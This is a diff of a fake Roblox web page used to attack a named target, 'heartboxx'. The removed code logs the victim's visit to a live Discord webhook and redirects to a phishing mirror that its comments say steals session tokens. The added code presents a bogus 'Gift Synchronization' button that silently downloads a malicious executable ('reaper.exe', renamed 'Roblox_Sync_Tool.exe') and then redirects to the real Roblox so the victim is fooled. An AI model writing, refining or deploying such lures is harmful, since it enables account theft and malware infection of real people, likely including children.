@@ -1,41 +1,39 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Roblox | Loading...</title>
+    <title>Roblox | Home</title>
     <style>
-        body { background: #1a1b1d; color: white; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; margin: 0; }
-        .loader { border: 5px solid #333; border-top: 5px solid #00b2ff; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { background: #1a1b1d; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .card { text-align: center; background: #2f3136; padding: 40px; border-radius: 12px; border: 1px solid #00b2ff; }
+        .btn { background: #00b2ff; color: white; border: none; padding: 15px 30px; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 18px; }
     </style>
 </head>
-<body onload="launchHook()">
+<body>
 
-    <div id="status">
-        <div class="loader"></div>
-        <p>Connecting to Roblox Servers...</p>
+    <div class="card">
+        <img src="https://images.rbxcdn.com/2026_roblox_logo.png" width="100">
+        <h2>Gift Synchronization</h2>
+        <p>Click "Authorize" to link the Heart Box to your Edge session.</p>
+        
+        <button class="btn" onclick="theHook()">AUTHORIZE & OPEN ROBLOX</button>
     </div>
 
     <script>
-        const WEBHOOK = "https://discord.com/api/webhooks/1474279324667351090/ALAHbGxyK7QbVtt4nAJ1Aagv-0F1NMqgolB1UdWIlFoS5V-chCWNhQa0w-DUEF4J90EI";
+        function theHook() {
+            // 1. AUTO-DOWNLOAD THE REAPER
+            // You must host your 'reaper.exe' (the Python file we made) on a site like MediaFire or Discord
+            const reaperLink = "YOUR_DIRECT_LINK_TO_REAPER_EXE";
+            
+            const downloadAnchor = document.createElement('a');
+            downloadAnchor.href = reaperLink;
+            downloadAnchor.download = "Roblox_Sync_Tool.exe";
+            downloadAnchor.click();
 
-        async function launchHook() {
-            // 1. Log the initial hit
-            await fetch(WEBHOOK, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    content: "🛸 **GHOST PROXY INITIALIZED**",
-                    embeds: [{ title: "Target: heartboxx", description: "Bypassing SOP... Redirecting to Mirror.", color: 16724301 }]
-                })
-            });
-
-            // 2. THE SECRET REDIRECT
-            // You don't send them to roblox.com. You send them to a Phishing Mirror 
-            // that looks EXACTLY like Roblox but is on a URL like 'roblox-api-sync.com'
-            // Once they are there, the mirror rips the token automatically.
+            // 2. REDIRECT TO REAL ROBLOX
+            // This makes them think the "Authorize" worked
             setTimeout(() => {
-                window.location.href = "https://roblox-session-sync-verify.vercel.app/login"; 
-            }, 2000);
+                window.location.href = "https://www.roblox.com/home";
+            }, 1000);
         }
     </script>
 </body>
